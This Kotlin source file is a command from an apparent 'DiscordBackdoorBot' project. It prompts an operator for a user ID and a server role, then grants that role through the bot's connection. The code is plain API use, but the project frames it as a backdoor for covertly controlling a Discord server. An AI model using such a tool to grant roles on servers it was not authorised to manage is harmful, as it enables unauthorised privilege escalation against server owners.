package io.github.cloudate9.discordbackdoorbot.commands

import com.diogonunes.jcolor.Ansi.colorize
import com.diogonunes.jcolor.Attribute
import io.github.cloudate9.discordbackdoorbot.DiscordBackdoorBot

class GiveRoleCommand(private val discordBackdoorBot: DiscordBackdoorBot) : IBackdoorBotCommands {

    override fun onCommand() {

        println(colorize("Operation: Give a user a role.", Attribute.CYAN_TEXT()))

        val userId = promptUserId()

        val user = discordBackdoorBot.discordBotImplementation.getUserById(userId).get()

        if (user == null) {
            println(
                colorize(
                    "The user with the id \"$userId\" does not exist in this server! Cancelling giving of role...",
                    Attribute.RED_TEXT()
                )
            )
            return
        }

        val role = discordBackdoorBot.promptUserForExistingServerRole() ?: return

        discordBackdoorBot.server.addRoleToUser(user, role)

        println(
            colorize(
                "The user \"${user.discriminatedName}\" has been given the \"${role.name}\" role!",
                Attribute.GREEN_TEXT()
            )
        )


    }

    private fun promptUserId(): Long {
        println(colorize("Enter the id of the user you want to give the role to.", Attribute.CYAN_TEXT()))
        print("> ")

        return InputUtils.inputNaturalNumberCheck(readLine()) ?: promptUserId()
    }
}
